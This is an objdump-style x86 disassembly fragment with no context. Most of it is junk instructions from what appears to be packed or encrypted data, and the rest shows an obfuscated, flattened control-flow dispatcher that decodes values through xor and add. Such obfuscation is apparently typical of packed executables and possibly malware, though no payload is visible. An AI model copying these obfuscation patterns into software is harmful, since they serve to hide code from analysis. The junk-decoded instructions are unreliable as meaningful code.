  408ae4:	loope  0x408b49
  408ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ae7:	mov    ch,0x86
  408ae9:	mov    BYTE PTR cs:[edx],al
  408aec:	lahf   
  408aed:	push   esp
  408aee:	retf   
  408aef:	dec    edi
  408af0:	and    esp,esi
  408af2:	aam    0xf6
  408af4:	stos   BYTE PTR es:[edi],al
  408af5:	(bad)  
  408af6:	loopne 0x408b6f
  408af8:	xor    ebx,DWORD PTR [edx]
  408afa:	fs push ds
  408afc:	sub    al,dh
  408afe:	dec    edx
  408aff:	jmp    0x85eb:0xca221117
  408b06:	xor    BYTE PTR [eax+ebp*1],0x15
  408b0a:	jmp    0xd310:0x83ca423e
  408b11:	addr16 ret 
  408b13:	push   esi
  408b14:	ds aas 
  408b16:	mov    esi,0xda133ef7
  408b1b:	pop    edi
  408b1c:	push   edi
  408b1d:	push   esi
  408b1e:	xchg   esp,eax
  408b1f:	push   0x47
  408b21:	test   al,0x4
  408b23:	xchg   BYTE PTR [eax+0x61dadbdd],dl
  408b29:	and    dh,cl
  408b2b:	jbe    0x408af3
  408b2d:	mov    bl,BYTE PTR [ebp-0x2d]
  408b30:	scas   eax,DWORD PTR es:[edi]
  408b31:	jae    0x408b0a
  408b33:	jmp    0x408b04
  408b35:	jae    0x408ba1
  408b37:	jo     0x408b43
  408b39:	jnp    0x408b6b
  408b3b:	cmp    esi,DWORD PTR [ebp-0x3ebae211]
  408b41:	inc    esi
  408b42:	fidivr DWORD PTR [ebx-0x381a8ec5]
  408b48:	pop    ecx
  408b49:	sbb    ch,ch
  408b4b:	xor    DWORD PTR [ebx],ebp
  408b4d:	cwde   
  408b4e:	jg     0x408af0
  408b50:	call   0x24bbc849
  408b55:	xchg   ebp,eax
  408b56:	dec    edi
  408b57:	daa    
  408b58:	sahf   
  408b59:	add    eax,0xac5f00f0
  408b5e:	lock (bad) 
  408b60:	stos   BYTE PTR es:[edi],al
  408b61:	inc    eax
  408b62:	pushf  
  408b63:	test   DWORD PTR [edx+ebx*1-0x6e],esp
  408b67:	sahf   
  408b68:	dec    esi
  408b69:	cmp    al,0xe5
  408b6b:	or     eax,0xad2afc08
  408b70:	aad    0x1f
  408b72:	dec    esp
  408b73:	xor    DWORD PTR [ebp-0x1a1b6f0d],0xc8b0de5e
  408b7d:	stc    
  408b7e:	jle    0x408b9f
  408b80:	sbb    al,0xde
  408b82:	mov    bh,0x36
  408b84:	mov    ecx,0xefc1a452
  408b89:	(bad)  
  408b8b:	xor    dh,cl
  408b8d:	pop    ss
  408b8e:	xchg   ebp,eax
  408b8f:	pop    esp
  408b90:	out    dx,al
  408b91:	mov    esi,0x3412a7d1
  408b96:	out    dx,eax
  408b97:	and    ch,BYTE PTR [edx-0x3ed358c4]
  408b9d:	loopne 0x408ba4
  408b9f:	inc    esp
  408ba0:	xor    ch,BYTE PTR [ebp+0x24bfacb]
  408ba6:	ins    BYTE PTR es:[edi],dx
  408ba7:	adc    eax,0xff1c36a0
  408bac:	ss jne 0x408bef
  408baf:	ins    DWORD PTR es:[edi],dx
  408bb0:	pop    ebp
  408bb1:	adc    BYTE PTR [ecx-0x80],bl
  408bb4:	adc    BYTE PTR [eax+ecx*1+0x3e],dl
  408bb8:	(bad)  
  408bb9:	or     BYTE PTR [edx-0x4faab2e7],bh
  408bbf:	rcl    ecx,cl
  408bc1:	dec    ebx
  408bc2:	sbb    al,0xcb
  408bc4:	cwde   
  408bc5:	mov    WORD PTR [edi+0xb],es
  408bc8:	dec    edi
  408bc9:	sbb    BYTE PTR [eax+0x1b],ah
  408bcc:	aas    
  408bcd:	dec    ebx
  408bce:	pop    ss
  408bcf:	loope  0x408b9e
  408bd1:	jp     0x408bd4
  408bd3:	jo     0x408bf4
  408bd5:	mov    ds:0xd061f11c,eax
  408bda:	jb     0x408b73
  408bdc:	call   0x9e571458
  408be1:	push   esi
  408be2:	xor    BYTE PTR [eax-0x75b53844],cl
  408be8:	mov    eax,ds:0x9e29376a
  408bed:	std    
  408bee:	xchg   esp,eax
  408bef:	mov    ch,0x47
  408bf1:	cld    
  408bf2:	mov    edx,0xd5c8d0c3
  408bf7:	mov    eax,0x89970ffd
  408bfc:	lock xchg ebx,eax
  408bfe:	lock xchg esi,eax
  408c00:	(bad)  
  408c01:	mov    bl,0x5b
  408c03:	ins    DWORD PTR es:[edi],dx
  408c04:	jnp    0x408c7a
  408c06:	neg    BYTE PTR [ecx+0x6d]
  408c09:	pusha  
  408c0a:	sbb    DWORD PTR [ebx],esi
  408c0c:	lahf   
  408c0d:	enter  0xe10e,0xa4
  408c11:	inc    esi
  408c12:	xchg   ecx,eax
  408c13:	retf   0x513c
  408c16:	nop
  408c17:	mov    esp,0xf12563dd
  408c1c:	jmp    0x4d3ea759
  408c21:	dec    esp
  408c22:	cs out 0x70,eax
  408c25:	mov    bl,BYTE PTR [ecx+0x74]
  408c28:	pop    edx
  408c29:	dec    edi
  408c2a:	and    esi,ecx
  408c2c:	shl    DWORD PTR [edx-0x2655faf2],0x6
  408c33:	dec    edx
  408c34:	mov    edi,0xd9b8c9f1
  408c39:	dec    esp
  408c3a:	and    eax,edi
  408c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c3d:	leave  
  408c3e:	mov    bl,0x65
  408c40:	cli    
  408c41:	pop    es
  408c42:	adc    esp,DWORD PTR [esi+0x2fd2c3cb]
  408c48:	cwde   
  408c49:	loopne 0x408c3b
  408c4b:	cld    
  408c4c:	pop    es
  408c4d:	nop
  408c4e:	stc    
  408c4f:	test   al,0x36
  408c51:	jne    0x408c98
  408c57:	mov    eax,ds:0x41497e
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x4346c3,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434687,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x4346b7,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x4345ef,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x4346ff,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x434677,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	leave  
  408cca:	add    BYTE PTR [esi+0x7ee54476],0x7e
  408cd1:	loope  0x408d4b
  408cd3:	jle    0x408d53
  408cd5:	ins    BYTE PTR es:[edi],dx
  408cd6:	(bad)  
  408cd8:	div    BYTE PTR [eax+0x35436dc0]
  408cde:	cs ret 
  408ce0:	ret    0xf11c
  408ce3:	xor    al,0xa3
  408ce5:	outs   dx,BYTE PTR ds:[esi]
  408ce6:	gs gs mov ecx,0xef117e7c
  408ced:	adc    bh,BYTE PTR [edi]
  408cef:	push   ss
  408cf0:	cmp    eax,0x7fcc9f3
  408cf5:	pop    ebx
  408cf6:	and    BYTE PTR [ebx-0x6d214b9d],dl
  408cfc:	out    0xca,eax
  408cfe:	stos   BYTE PTR es:[edi],al
  408cff:	js     0x408d2e
  408d01:	jmp    0x408d03
  408d03:	je     0x408ce2
  408d05:	js     0x408c95
  408d07:	adc    DWORD PTR [ebx-0x4b72e524],esp
  408d0d:	scas   eax,DWORD PTR es:[edi]
  408d0e:	push   es
  408d0f:	aam    0x2f
  408d11:	inc    esp
  408d12:	rcl    DWORD PTR [eax+0x3b7bcd1c],cl
  408d18:	call   0x2e02e28d
  408d1d:	xchg   esi,eax
  408d1e:	lock je 0x408cfa
  408d21:	and    al,0x45
  408d23:	inc    esi
  408d24:	pop    edx
  408d25:	or     edi,0x102467e1
  408d2b:	ret    
  408d2c:	movupd XMMWORD PTR [edx+0x4a944e4a],xmm3
  408d34:	fdiv   st,st(1)
  408d36:	mov    ebp,0xc67419cf
  408d3b:	pop    esp
  408d3c:	mov    bl,0x87
  408d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d3f:	adc    DWORD PTR [edi-0x1e],ecx
  408d42:	popa   
  408d43:	rcr    bh,cl
  408d45:	mov    ah,0x5d
  408d47:	adc    DWORD PTR [edx],eax
  408d49:	sahf   
  408d4a:	pop    es
  408d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d4c:	loop   0x408d05
  408d4e:	call   0xf45275d2
  408d53:	sub    al,0xb5
  408d55:	repz adc al,0x12
  408d58:	or     edx,DWORD PTR [esi+0x77b8b4bd]
  408d5e:	out    0x1f,eax
  408d60:	lds    eax,FWORD PTR [ebx]
  408d62:	clc    
  408d63:	xchg   ebx,ebp
  408d65:	jge    0x408d71
  408d67:	sbb    BYTE PTR [edx],0x66
  408d6a:	jg     0x408da2
  408d6c:	test   eax,0xf412b7b6
  408d71:	cmc    
  408d72:	jge    0x408dda
  408d74:	jnp    0x408d0f
  408d76:	mov    ecx,fs
  408d78:	pusha  
  408d79:	je     0x408d97
  408d7b:	jno    0x408d11
  408d7d:	push   edi
  408d7e:	xor    al,0xf1
  408d80:	aam    0x5
  408d82:	fcomip st,st(6)
  408d84:	cmp    BYTE PTR [edx+0x6ec7fca8],cl
  408d8a:	pusha  
  408d8b:	inc    DWORD PTR [ecx-0x29a902f1]
  408d91:	jns    0x408d67
  408d93:	repz mov esp,0x641d3ad3
  408d99:	inc    ebx
  408d9a:	sbb    al,BYTE PTR [ecx]
  408d9c:	(bad)  
  408d9d:	push   edi
  408d9e:	popa   
  408d9f:	ret    
  408da0:	pusha  
  408da1:	cmp    esp,ebx
  408da3:	cdq    
  408da4:	mov    edi,0x835fd205
  408da9:	in     al,dx
  408daa:	lods   eax,DWORD PTR ds:[esi]
  408dab:	cmp    ebx,DWORD PTR [edi+ebx*4]
  408dae:	(bad)  
  408db0:	jno    0x408e1d
  408db2:	xor    esp,DWORD PTR [ebx-0x5e]
  408db5:	call   0xd2c0:0xa65a66b6
  408dbc:	enter  0xa00b,0x42
  408dc0:	sub    eax,0x3bf08dc6
  408dc5:	les    esi,FWORD PTR [edx]
  408dc7:	cmc    
  408dc8:	mov    al,ds:0x684c539d
  408dcd:	pushf  
  408dce:	ins    BYTE PTR es:[edi],dx
  408dcf:	add    ebx,DWORD PTR [edx-0x48]
  408dd2:	into   
  408dd3:	xor    dl,bl
  408dd5:	pop    esp
  408dd6:	or     DWORD PTR [edi],edx
  408dd8:	fisubr DWORD PTR [eax+0x77]
  408ddb:	pop    ebx
  408ddc:	or     DWORD PTR [ebx-0xdffdc92],esp
  408de2:	mov    al,0x95
  408de4:	push   0xffffff8d
  408de6:	mov    bl,0x6b
  408de8:	mov    dl,0xb1
  408dea:	sahf   
  408deb:	sbb    edx,DWORD PTR [eax-0x45da325c]
  408df1:	bound  esi,QWORD PTR [eax+0x51]
  408df4:	fcomi  st,st(3)
  408df6:	add    BYTE PTR [eax+0x52589b92],ch
  408dfc:	aam    0xf2
  408dfe:	lea    edx,[ebx+0x29]
  408e01:	push   es
  408e02:	pop    ds
  408e03:	add    al,BYTE PTR [eax+0x76ffcfd0]
  408e09:	ss lock adc dl,ah
  408e0d:	cld    
  408e0e:	je     0x408dab
  408e10:	jb     0x408e34
  408e12:	jne    0x408dd0
  408e14:	inc    edi
  408e15:	inc    esp
  408e16:	push   ebx
  408e17:	sahf   
  408e18:	sub    eax,eax
  408e1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e1b:	popf   
  408e1c:	imul   esp,DWORD PTR [ecx],0x3e
  408e1f:	add    eax,0x9605511a
  408e24:	xor    bl,BYTE PTR [ebp+0x7f4859b0]
  408e2a:	inc    ecx
  408e2b:	and    al,0xcc
  408e2d:	mov    dl,0xaa
  408e2f:	cmp    BYTE PTR ds:0x153308fa,0xb7
  408e36:	popf   
  408e37:	lods   eax,DWORD PTR ds:[esi]
  408e38:	ret    
  408e39:	push   0xfffffffc
  408e3b:	test   eax,0x702b4516
  408e40:	sahf   
  408e41:	add    ch,bh
  408e43:	or     esp,DWORD PTR [eax-0x36]
  408e46:	fwait
  408e47:	and    eax,0x80e0ec97
  408e4c:	cli    
  408e4d:	or     eax,0x6aad0241
  408e52:	mov    dl,0x28
  408e54:	loop   0x408e54
  408e56:	sub    edx,DWORD PTR [ecx+eiz*4]
  408e59:	or     cl,BYTE PTR [edx]
  408e5b:	xor    BYTE PTR [edx],cl
  408e5d:	dec    ebx
  408e5e:	call   0x1efa9c1c
  408e63:	aad    0x96
  408e65:	add    edi,DWORD PTR [edi]
  408e67:	jne    0x408ebe
  408e69:	mov    ah,0xbf
  408e6b:	test   eax,0x99add219
  408e70:	pop    ecx
  408e71:	add    al,BYTE PTR [edx-0x64623834]
  408e77:	sub    DWORD PTR ss:[ebx],0x45
  408e7b:	push   ds
  408e7c:	ror    BYTE PTR [ecx-0x11c9269e],1
  408e82:	outs   dx,BYTE PTR ds:[esi]
  408e83:	daa    
  408e84:	shr    DWORD PTR es:[edi+eax*1+0x11],1
  408e89:	(bad)
  408e8c:	ja     0x408e1e
  408e8e:	mov    cl,0xc4
  408e90:	and    bl,BYTE PTR [ebp-0x7a1e143e]
  408e96:	push   es
  408e97:	cld    
  408e98:	xor    edi,DWORD PTR [ecx+0x2]
  408e9b:	xchg   ebp,eax
  408e9c:	mov    edx,0x3a3805d7
  408ea1:	push   ss
  408ea2:	and    DWORD PTR [esi],esi
  408ea4:	sbb    ebp,DWORD PTR [edi+0x3e2b7430]
  408eaa:	cmp    ch,ch
  408eac:	push   0x99b61e62
  408eb1:	jmp    0x408e57
  408eb3:	lahf   
  408eb4:	inc    esi
  408eb5:	ss out 0x83,eax
  408eb8:	mov    ah,BYTE PTR [edi]
  408eba:	aaa    
  408ebb:	xchg   ecx,eax
  408ebc:	xor    eax,0xd3feff4d
  408ec1:	popf   
  408ec2:	mov    BYTE PTR [edx],bh
  408ec4:	jb     0x408eaa
  408ec6:	gs jns 0x408f48
  408ec9:	mov    BYTE PTR [ecx+0x3a],ah
  408ecc:	or     eax,0x5807032d
  408ed1:	mov    al,0xcc
  408ed3:	jecxz  0x408e6c
  408ed5:	ins    DWORD PTR es:[edi],dx
  408ed6:	xor    al,0xe5
  408ed8:	(bad)  
  408ed9:	mov    ah,0xb
  408edb:	mov    cl,0x34
  408edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ede:	xlat   BYTE PTR ds:[ebx]
  408edf:	or     ch,dh
  408ee1:	addr16 sahf 
  408ee3:	jbe    0x408f0a
  408ee5:	js     0x408eec
  408ee7:	test   BYTE PTR [edx+0x45],ch
  408eea:	popa   
  408eeb:	icebp  
  408eec:	pop    ecx
  408eed:	neg    dl
  408eef:	lods   eax,DWORD PTR ds:[esi]
  408ef0:	test   DWORD PTR [esi-0x2c78a696],ecx
  408ef6:	(bad)  
  408ef7:	adc    DWORD PTR [esi],edx
  408ef9:	lahf   
  408efa:	mov    esp,0xed23c0d3
  408eff:	addr16 into 
  408f01:	aaa    
  408f02:	int3   
  408f03:	jl     0x408e88
  408f05:	dec    eax
  408f06:	push   cs
  408f07:	retf   
  408f08:	aad    0x2e
  408f0a:	adc    al,0x64
  408f0c:	xchg   BYTE PTR [ecx*4+0x37ec6f4d],dh
  408f13:	cmp    BYTE PTR [edx-0x391a02cf],al
  408f19:	mov    ch,0xa4
  408f1b:	mov    ah,BYTE PTR [esi+edi*2+0x4f]
  408f1f:	fisubr DWORD PTR ds:0xa34577d6
  408f25:	repnz mov eax,ds:0xa97dca32
  408f2b:	sbb    BYTE PTR [ecx+0xf],ah
  408f2e:	enter  0x1d88,0xee
  408f32:	stc    
  408f33:	je     0x408f6e
  408f35:	and    eax,0xcdfd2064
  408f3a:	int    0xe4
  408f3c:	adc    DWORD PTR [ebx+0x72],ebp
  408f3f:	and    eax,0x86583
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x4346c3,0x434683
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434703
  408f5a:	or     DWORD PTR ds:0x4346c3,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x4345df,0x43464f
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x4346c7,0x434647
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x4345eb
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x4346b7,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x4345ff,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1+0x5d226ce9]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x408fab
  408fec:	ret    0xee06
  408fef:	pusha  
  408ff0:	pop    ebx
  408ff1:	aas    
  408ff2:	push   eax
  408ff3:	add    eax,0x7e2ab3e6
  408ff8:	nop
  408ff9:	add    ebx,esp
  408ffb:	push   ebx
  408ffc:	mov    eax,ds:0xc264211a
  409001:	inc    ebp
  409002:	pop    esp
  409003:	pop    esi
  409004:	adc    eax,0x5c7240c
  409009:	cmp    BYTE PTR ds:0x606830fa,dh
  40900f:	sbb    al,0xb5
  409011:	dec    ebp
  409012:	add    al,BYTE PTR [esp+ebx*8-0xb8ee15c]
  409019:	jno    0x408fce
  40901b:	jp     0x408fdb
  40901d:	pop    ebx
  40901e:	sti    
  40901f:	xchg   cl,dh
  409021:	leave  
  409022:	dec    ecx
  409023:	out    0xdf,eax
  409025:	mov    dl,0xa0
  409027:	and    ebx,eax
  409029:	and    al,0xa7
  40902b:	jbe    0x408fba
  40902d:	popf   
  40902e:	mov    ecx,DWORD PTR [ebx+0x1433ae7c]
  409034:	pop    es
  409035:	mov    eax,ds:0x63513fd1
  40903a:	jmp    0x5a5d:0xe08d2efb
  409041:	pop    edx
  409042:	inc    ebx
  409043:	pushf  
  409044:	xchg   edx,eax
  409045:	sbb    BYTE PTR [esi+0x5b322fc1],cl
  40904b:	int3   
  40904c:	push   ecx
  40904d:	xchg   ebx,eax
  40904e:	push   ebx
  40904f:	in     eax,0x1e
  409051:	mov    eax,ds:0x20a95dc1
  409056:	outs   dx,BYTE PTR ds:[esi]
  409057:	push   ebp
  409058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409059:	mov    ebp,0x8a60448
  40905e:	ins    DWORD PTR es:[edi],dx
  40905f:	test   al,0x86
  409061:	repz mov ds:0xdc1695eb,al
  409067:	outs   dx,DWORD PTR ds:[esi]
  409068:	xchg   ebx,eax
  409069:	aad    0x4e
  40906b:	aas    
  40906c:	leave  
  40906d:	int3   
  40906e:	(bad)  
  40906f:	jmp    edi
  409071:	jnp    0x40907a
  409073:	and    dl,BYTE PTR ds:0xfe488e93
  409079:	sub    DWORD PTR [edx+ecx*1+0x42],edi
  40907d:	bound  edx,QWORD PTR [ebx]
  40907f:	inc    DWORD PTR [eax+0x2f83c049]
  409085:	or     edi,DWORD PTR [edx-0x4d]
  409088:	push   ecx
  409089:	jge    0x4090fa
  40908b:	pop    eax
  40908c:	xchg   ebp,eax
  40908d:	dec    ebx
  40908e:	je     0x40901d
  409090:	retf   
  409091:	xchg   esp,eax
  409092:	push   0xffffffb4
  409094:	pop    ebx
  409095:	scas   eax,DWORD PTR es:[edi]
  409096:	std    
  409097:	push   0x952c749a
  40909c:	jns    0x409065
  40909e:	adc    esi,DWORD PTR [ebx]
  4090a0:	in     al,dx
  4090a1:	xchg   ebp,eax
  4090a2:	outs   dx,DWORD PTR ds:[esi]
  4090a3:	daa    
  4090a4:	ins    BYTE PTR es:[edi],dx
  4090a5:	xlat   BYTE PTR ds:[ebx]
  4090a6:	popa   
  4090a7:	and    BYTE PTR [ebp-0x195e3adb],dh
  4090ad:	pop    eax
  4090ae:	out    dx,al
  4090af:	in     al,0x9a
  4090b1:	dec    edx
  4090b2:	addr16 inc edi
  4090b4:	(bad)  
  4090b6:	addr16 fwait
  4090b8:	call   FWORD PTR [ecx-0x7c385a7d]
  4090be:	push   esp
  4090bf:	test   BYTE PTR [edx-0xb],0x16
  4090c3:	sub    ebp,edi
  4090c5:	push   eax
  4090c6:	and    dh,ah
  4090c8:	jecxz  0x409067
  4090ca:	arpl   WORD PTR [eax-0x16],sp
  4090cd:	hlt    
  4090ce:	loop   0x4090d7
  4090d0:	jns    0x409105
  4090d2:	(bad)  
  4090d3:	pop    eax
  4090d4:	mov    bl,0x21
  4090d6:	push   esp
  4090d7:	or     dl,BYTE PTR [eax]
  4090d9:	sub    bl,bl
  4090db:	fld    TBYTE PTR [ecx+ebp*2]
  4090de:	push   ebx
  4090df:	sub    edi,DWORD PTR [esi]
  4090e1:	jo     0x4090c2
  4090e3:	je     0x409078
  4090e5:	mov    WORD PTR [eax],es
  4090e7:	retf   0x97e
  4090ea:	mov    ebx,DWORD PTR [eax]
  4090ec:	mov    ebx,DWORD PTR [eax]
  4090ee:	cmp    eax,0x2967f6d1
  4090f3:	repz push ebx
  4090f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090f6:	aad    0xfb
  4090f8:	add    bl,ah
  4090fa:	jge    0x409134
  4090fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090fd:	mov    ebx,DWORD PTR [ebp+eax*8-0x1]
  409101:	fidiv  WORD PTR [edi-0xb856427]
  409107:	fldl2e 
  409109:	ret    0xbf5c
  40910c:	mov    DWORD PTR [edi],0xe7c46f99
  409112:	arpl   WORD PTR [eax+0x115ee7f0],ax
  409118:	nop
  409119:	(bad)  
  40911a:	ds push 0x9510fe73
  409120:	into   
  409121:	pop    esi
  409122:	pop    ebp
  409123:	push   esi
  409124:	mov    bl,0xb5
  409126:	mov    edi,0x81d05951
  40912b:	jmp    0x1fe9:0xb46c2603
  409132:	push   ebp
  409133:	push   ecx
  409134:	fbld   TBYTE PTR [ebx]
  409136:	rcr    DWORD PTR [ecx+0x75],cl
  409139:	cld    
  40913a:	mov    al,0xeb
  40913c:	and    eax,0x812d62f
  409141:	mov    ds:0xed836632,al
  409146:	xor    edi,eax
  409148:	push   edx
  409149:	out    0x40,al
  40914b:	xchg   edi,eax
  40914c:	arpl   WORD PTR [edx-0x39],bx
  40914f:	push   edx
  409150:	mov    ds:0x6a9e95b6,al
  409155:	rol    BYTE PTR [ecx+ecx*2+0x76f54ac1],1
  40915c:	push   ecx
  40915d:	mov    dh,0x6
  40915f:	call   0xd0d6:0xe7896c26
  409166:	pusha  
  409167:	nop
  409168:	rcl    DWORD PTR [edi],cl
  40916a:	ins    DWORD PTR es:[edi],dx
  40916b:	cmp    al,al
  40916d:	xor    bh,bl
  40916f:	and    ebp,DWORD PTR [ecx-0x3c61c8e5]
  409175:	lds    edi,FWORD PTR [eax-0x6db14125]
  40917b:	or     ecx,DWORD PTR [edi-0x4d]
  40917e:	inc    eax
  40917f:	mov    esp,DWORD PTR [edx]
  409181:	lods   eax,DWORD PTR ds:[esi]
  409182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409183:	push   es
  409184:	jecxz  0x409142
  409186:	sbb    bl,BYTE PTR [ebx-0x54]
  409189:	shr    DWORD PTR ds:0x38a901e0,0xc
  409190:	les    esi,FWORD PTR [ebp+0x6027cae5]
  409196:	fnstenv [ebx]
  409198:	out    0x4c,eax
  40919a:	jmp    0xcde8:0x39e52750
  4091a1:	push   ecx
  4091a2:	xchg   DWORD PTR [edx-0x2a8ff07f],esp
  4091a8:	sub    dl,0xaf
  4091ab:	jecxz  0x409185
  4091ad:	shr    DWORD PTR [esi+0x1d731825],0xe7
  4091b4:	retf   
  4091b5:	mov    eax,ds:0xce34aa9f
  4091ba:	outs   dx,BYTE PTR ds:[esi]
  4091bb:	jle    0x409212
  4091bd:	push   esp
  4091be:	lahf   
  4091bf:	(bad)  
  4091c1:	das    
  4091c2:	and    ebx,DWORD PTR [ecx+esi*8-0x70aa25eb]
  4091c9:	sub    DWORD PTR [ecx+0x1d],edx
  4091cc:	sbb    esi,0x7d
  4091cf:	arpl   WORD PTR [esi+0x18],dx
  4091d2:	(bad)  
  4091d3:	fisub  DWORD PTR [eax]
  4091d5:	fmul   DWORD PTR [ecx-0x51b58de5]
  4091db:	jecxz  0x40915f
  4091dd:	lds    edi,FWORD PTR [edi]
  4091df:	mov    ds:0xc96d28a,al
  4091e4:	(bad)  
  4091e5:	imul   BYTE PTR [edx-0x24]
  4091e8:	in     al,dx
  4091e9:	push   ss
  4091ea:	call   0xaef2dec1
  4091ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091f0:	jg     0x409199
  4091f2:	sub    eax,0x1d8d7c9
  4091f7:	sub    eax,0xbd7329f3
  4091fc:	retf   0xd71d
  4091ff:	jb     0x409181
  409201:	pop    esi
  409202:	dec    edx
  409203:	push   eax
  409204:	and    al,0x82
  409206:	add    edi,DWORD PTR ds:0x346f4cac
  40920c:	mov    al,ds:0x515addd9
  409211:	and    cl,bl
  409213:	jae    0x409239
  409215:	xor    BYTE PTR [ecx+0x6dcc249e],bh
  40921b:	int3   
  40921c:	cli    
  40921d:	mov    edx,0x35446bb2
  409222:	sub    eax,0x320134e2
  409227:	stc    
  409228:	mov    ebx,0x9875b55d
  40922d:	xor    ebx,esp
  40922f:	jmp    0xd84fe431
  409234:	stc    
  409235:	test   eax,0x8d59a4f1
  40923a:	jle    0x409244
  40923c:	icebp  
  40923d:	sbb    DWORD PTR [edx+0x7597955c],edx
  409243:	repz clc 
  409245:	sub    ebx,DWORD PTR [ebx+0x3701451c]
  40924b:	jg     0x4092bc
  40924d:	pop    ecx
  40924e:	add    al,0x4a
  409250:	loope  0x40925e
  409252:	stos   BYTE PTR es:[edi],al
  409253:	dec    esp
  409254:	xor    esp,edx
  409256:	xor    eax,esi
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x434637,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x43463b,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	fsub   DWORD PTR [eax-0x1d6ddc99]
  40931b:	jle    0x40939b
  40931d:	jo     0x409398
  40931f:	jle    0x40939f
  409321:	add    eax,edi
  409323:	xchg   edx,eax
  409324:	or     DWORD PTR ds:0xf291a0fc,esi
  40932a:	mov    bh,0x73
  40932c:	in     eax,dx
  40932d:	jle    0x409356
